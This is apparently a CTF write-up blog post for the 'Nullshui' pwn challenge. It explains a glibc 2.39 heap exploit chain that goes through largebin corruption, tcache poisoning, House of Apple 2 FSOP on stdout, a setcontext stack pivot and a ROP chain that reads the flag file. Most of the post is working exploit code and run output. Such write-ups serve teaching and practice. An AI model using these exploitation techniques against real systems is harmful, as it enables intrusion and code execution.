+++
author = "Velobobo"
title = "OmniCTF 2026 - Nullshui"
date = "2026-09-10"
description = ""
draft = false
slug = "omni-2026-nullshui"
ctfs = ["Omni-2026"]
tags = ["heap","fsop","ctf"]
categories = ["pwn"]
+++



# Nullshui - Omni CTF 2026

## Overview 

Finally, after procrastinating for months, I decided to actually write a writeup for this challenge. This was one of the first challenges I solved where I had to chain multiple primitives together to eventually get code execution, so I thought it deserved a proper writeup.

At first glance, this challenge doesn't look particularly exciting.  
We have a fairly standard heap interface: allocate, free, view, and one operation that lets us zero a 16 byte aligned qword in the heap and we can only use it once. 

you can grab the challenge files from [here](https://github.com/OmniCTF/nullshui)

```python {linenos=false}
1. alloc
2. free
3. view
4. zero
5. exit
> 

```

The binary is about as hardened as you would expect: `Full RELRO , NX , PIE , Stack Canary , glibc 2.39 , seccomp  `

The seccomp filter blocks `execve` and `execveat`, so even if we eventually get control of RIP, the usual system("/bin/sh") route isn't going to work.  
There is also no obvious UAF that would let us immediately turn the heap primitives into a tcache poisoning attack. So we have to build the exploit piece by piece and somehow implement ROP to read the flag file.  
The interesting primitive here is the one-time heap NULL write. On its own, it doesn't look particularly powerful. But it turns out it kinda is , This is where `largebins` come into the picture.

The final exploit chains together several different ideas:


libc leak , heap leak  
  ↓  
largebin metadata corruption  
  ↓  
overlapping chunks  
  ↓  
tcache poisoning  
  ↓  
`_IO_2_1_stdout_` corruption   
  ↓  
setcontext  
  ↓  
stack pivot  
  ↓  
ROP  
  ↓  
read flag  

lets go through all this step by step 



## Heap grooming and getting leaks



Now that we know what primitives we have, the first thing we need is information about where everything actually lives.  
Since PIE and ASLR are enabled, we'll eventually need both a libc leak and a heap leak.

I start by allocating the following chunks

```python {linenos=false}
alloc(0, 0x410, b"A")
alloc(1, 0x500, b"P")
alloc(2, 0x100, b"Guard")
alloc(3, 0x520, b"Q")
alloc(4, 0x100, b"Guard")
alloc(7, 0x400, b"F")
```

The two guard chunks aren't there just for decoration. When I eventually free P and Q, I don't want them to merge with their neighbours through heap consolidation, so the guards keep the chunks isolated.

There's another important detail here, all chunks except `F` have a user-requested size larger than the maximum tcache request `(0x408)`. Therefore, when freed, `P` and `Q` won't end up in tcache. This is exactly what I want because I need them to reach the unsorted bin and eventually the largebin.

`F`, on the other hand, is intentionally `0x400`. I'll leave that one alone for now , it will become useful later when we start messing with tcache.



```python
free(1)
free(3)
alloc(5, 0x1000, b"sort chunks in largebin")

```



Freeing `P` and `Q` initially puts them into the unsorted bin.  
The large allocation forces malloc to process the unsorted bin. Since `P` and `Q` are too large for the smallbins, they are sorted into the appropriate largebin.  
This is useful because a freed largebin chunk contains considerably more interesting metadata than an allocated chunk.

A largebin chunk looks roughly like:

```python {linenos=false}
prev-size | size | fd | bk | fdnextsize | bknextsize
```

These fields form a double linked list with the large-bin as a head pointer , and as the bin head lives in the libc this gives us the required leaks

largebin_head --> Q --> P --> largebin_head  

{{< figure src="gdb_output1.png" alt="img" width="800" >}}


```python {linenos=false}
P->fd = largebin_head 
P->bk = Q 
Q->fd = P 
Q->bk = largebin_head
```

we can now allocate these chunks and leak the metadata and calculate the libc and heap base 

```python
alloc(3, 0x520, b'A'*8) # alloc Q 
view(3)

libc.address=u64(p.recvline()[8:-1].ljust(8,b'\\x00'))-0x203f50

free(3)         # free Q
alloc(9, 0x600, b"put Q in largebin")

alloc(1, 0x500, b'B'*16)    # alloc P
view(1)

heap_base=u64(p.recvline()[16:-1].ljust(8,b'\\x00'))-0xcd0

free(1)         # free P
alloc(10, 0x600, b"put P in largebin")

```

## Largebin Corruption

We now have everything needed to start exploiting the allocator. But before touching `zero()`, we need to understand one slightly unusual part of largebins: the `fd_nextsize / bk_nextsize` pointers.

Apart from the usual doubly linked list using `fd,bk` , the largebins also maintains another doubly linked list using `fdnextsize,bknextsize` which is used to skip between chunks of same size and directly move along the chunks of different size , more precisely it forms a size-ordered chain which allows malloc to efficiently search through chunks of different sizes instead of blindly walking every chunk in the bin. When chunks are inserted into largebins from unsorted bins , the chunks are added in a sorted order. Following the fdnextsize ptr we get to chunks of smaller sizes.


In our case, `Q` is larger than `P`, so following `Q->fd_nextsize` eventually leads us towards the smaller chunk `P`.

The doubly-linkedlist for (fd,bk) pair is like `binhead --> Q-->P-->binhead` and for (fdnextsize,bknextsize) pair is like `Q-->P`


Now what happens if we use the heap NULL write primitive to null out this `P->fdnextsize` and remove chunk `P` from largebin by allocating it?

When malloc takes a chunk out of a bin, it eventually calls `unlink_chunk()`



```c
unlink_chunk (mstate av, mchunkptr p) {

 if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
    malloc_printerr ("corrupted double-linked list");

// unlink mechanism on (fd,bk) doubly-linked list
fd->bk = bk;
bk->fd = fd;

if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL){

// unlink mechanism on (fdnextsize,bknextsize) doubly-linked list

}
}
```



The interesting detail is the condition: `p->fd_nextsize != NULL`  
If `P->fd_nextsize` is a valid pointer, glibc performs the normal `fd_nextsize / bk_nextsize` unlinking as well.  
But we have just changed it to `NULL`.



So when `unlink_chunk(P)` runs, glibc only unlinks the chunk from the (fd,bk) list but not from (fdnextsize,bknextsize) list
so after `unlink_chunk` is called on chunk `P` , Q's fdnextsize still points to P. the largebin state is like this 

(fd,bk) : `binhead-->Q-->binhead`   
(fdnextsize,bknextsize) : `Q-->P`



Now if we again try to alloc another `0x500` chunk , the request goes to largebin and it checks the size of chunk at head which is `Q` and sees the `chunksize(Q) > requested size` so it walks through `Q->bknextsize` to walk through the chunks from smallest to biggest size to find the most suitable minimum sized chunk which could satisfy the request and as `Q->bknextsize` was still pointing to `P` the allocator thinks it found the required chunk and returns the chunk `P` to us. This results in us having the address of chunk `P` in two different slots. 

```python
p_user=heap_base+0x6c0
p_header=p_user-0x10

zero((p_user+0x10-heap_base)/8)     # zero out P->fdnextsize
alloc(1, 0x500, p64(p_header) * 2+p64(0)*2 + b"P1") # alloc P
alloc(6, 0x500, b"P2") # Get same chunk P allocated

free(1) # free P
free(0) # consolidate 0,1  merging A,P

```

Notice i wrote `pheader` into `fd,bk` pointers of the chunk `P` after allocting it once thats because when i try to allocate it again and glibc calls `unlink_chunk()` again on `P` , it needs to pass the check `fd->bk == p , bk->fd == p` otherwise `unlink_chunk()` will throw an error.  

next we free chunk `A,P` which makes them consolidate in the heap .This newly consolidated chunk covers the memory where `P` used to live.


## Overlapping chunks & Tcache Poisoning


Now that we have two pointers to the same physical chunk, we can finally make the overlap useful.  
The goal of this stage is to turn our heap overlap into an arbitrary allocation primitive using tcache poisoning. In particular, we want a future `malloc(0x400)` to return `_IO_2_1_stdout_`.

Recall that `P` is located `0x410` bytes into the consolidated region created by merging `A` and `P`.  
Since we can now control the entire consolidated chunk, we can write a fake chunk header at the old location of `P`

```python
alloc(0, 0x928, b'A'*0x410+p64(0)+p64(0x411)+p64(0)+p64(0)) # make fake chunk at P through the consolidated chunk

free(7) # free F as a dummy chunk and add it to tcache
free(6) # free the fake chunk and add it to tcache
```

We set `prevsize=0`, `size=0x411` and then free the fake chunk which puts it into  tcache . now this freed chunk is still acessible from our consolidated memory so we do the classic tcache poisoning by writing the mangled ptr we want malloc to return to us in the `next` ptr of the tcache chunk


```python
stdout = libc.sym["_IO_2_1_stdout_"]
rop_start_addr=heap_base+0x2a0+0x440
rop_chain=construct_rop_chain(rop_start_addr)

free(0)
alloc(0, 0x928, b'A'*0x410+p64(0)+p64(0x411)+p64((p_user>>12)^stdout)+p64(0)+b'flag.txt'+p64(0)+rop_chain)
alloc(6,0x400,b'DUMMY')

stdout_payload=construct_stdout_payload()
alloc(11,0x400,stdout_payload) # Alloc _IO_2_1_stout_ 
```



We are trying to malloc `_IO_2_1_stdout_` because that way we can perform FSOP which leads us to control flow hijacking.

As we know the heap_base we can calc the addresses of the data we setup at the heap , so we are also utilizing this chunk's memory to place our ROP chain and the string `"flag.txt"` in it.


## FSOP - House of Apple 2 | setcontext | ROP

Now we have control over `_IO_2_1_stout_` which is a glibc `FILE` structure.  
There are plenty of other good blogs which explain `house of apple 2` so i am not gonna explain it (ps i am tired of writing this post)  
I will just explain the basic idea  
We setup the `stdout` FILE struct such that when stdout will try to print something it will trigger this chain
`_IO_wfile_overflow(fp)` --> `_IO_wdoallocbuf(fp)` --> `_IO_WDOALLOCATE(fp)` --> `*(fp->_wide_data->_wide_vtable+0x68)(fp)`

For full explanation on how house of apple 2 works you can read this blog [Roderick chan's Blog](https://www.roderickchan.cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/)

```python
def construct_stdout_payload():
_IO_wfile_jumps = libc.sym["_IO_wfile_jumps"]
setcontext=libc.sym["setcontext"]
leave_ret=libc.address+0x299d2

# setcontext --> +0x78 : rbp , +0xa8:rip
fp = flat(
    {   
           0x68: setcontext, # _wide_data->vtable->wdoallocate
           0x78:rop_start_addr-0x8, # rbp    -0x8 to account for pop(rbp) in leave;ret
           0x88:stdout+0xE8+0x90, #lock
           0xa0:stdout, #_wide_data
           0xa8:leave_ret, # rip 
           0xd8:_IO_wfile_jumps, # vtable
           0xE0: stdout # wide_data->vtable
       },

       filler=b"\x00",

   )
   return bytes(fp)

```

```python
stdout_payload=construct_stdout_payload()
alloc(11,0x400,stdout_payload) # Alloc _IO_2_1_stout_
```

Recall because of `seccomp` we couldnt do the usual `system(/bin/sh)` otherwise we could have just called it using this fsop on stdout , so to achieve ROP we can use `setcontext` which lets us arbitrarily set all the registers which we can then use to stack pivot on the rop chain we set up at the heap.

From the assembly dump of `setcontext` function we see that `+0xa8` is the offset for `rip` and `+0x78` is the offset for `rbp` in the `ucontext_t *` argument that `setcontext` needs. so we setup the payload according to that and choose `rip=leave;ret` and `rbp=rop_start_addr-0x8` which will stack pivot to our rop chain

```python
def construct_rop_chain(rop_start_addr):
   rop=ROP(libc)
   poprdi=rop.find_gadget(['pop rdi','ret']).address
   poprsi=rop.find_gadget(['pop rsi','ret']).address
   xchg_edx_eax=libc.address+0x11ea8a
   poprax=rop.find_gadget(['pop rax','ret']).address
   syscall=rop.find_gadget(['syscall','ret']).address
   poprcx=rop.find_gadget(['pop rcx','ret']).address
   sendfile=libc.sym['sendfile']

   payload=flat(
       poprdi,rop_start_addr-0x10,poprsi,0,poprax,2,syscall,
       poprdi,1,poprsi,3,poprax,0,xchg_edx_eax,poprcx,100,sendfile
       )

   return payload
```
Calling `open("flag.txt",0,0)` , `sendfile(1,3,0,100)` through the rop chain to print the flag 

Now to trigger the payload we needn't call `exit()` as `stdout` will try to output something after our input so `_IO_wfile_overflow` will get called internally which will trigger our exploit.


## END

```python
$ python3 sol2.py 
[+] Starting local process '/home/parth/ctfs/omni/main_patched': pid 7259

[+] Libc base : 0x723b0f200000
[+] Heap base : 0x604dba822000
[*] Loaded 111 cached gadgets for './libc.so.6'
[*] Switching to interactive mode

omniCTF{DEMO_FLAG}
```

At last a small debugging detour    
At first i was trying to call libc `open()` wrapper in the rop but due to my string `"flag.txt"` being just below the rop chain it was being overwritten by the newly created stack frame of `open()` so i switched to the syscall version. This could have been fixed easily but then i would have to move the string elsewhere and change the offsets and i was too lazy to do it.

You can find the full exploit script [here](https://github.com/Velobobo/ctf-writeups/blob/main/Omnictf-2026/nullshui/solve.py)



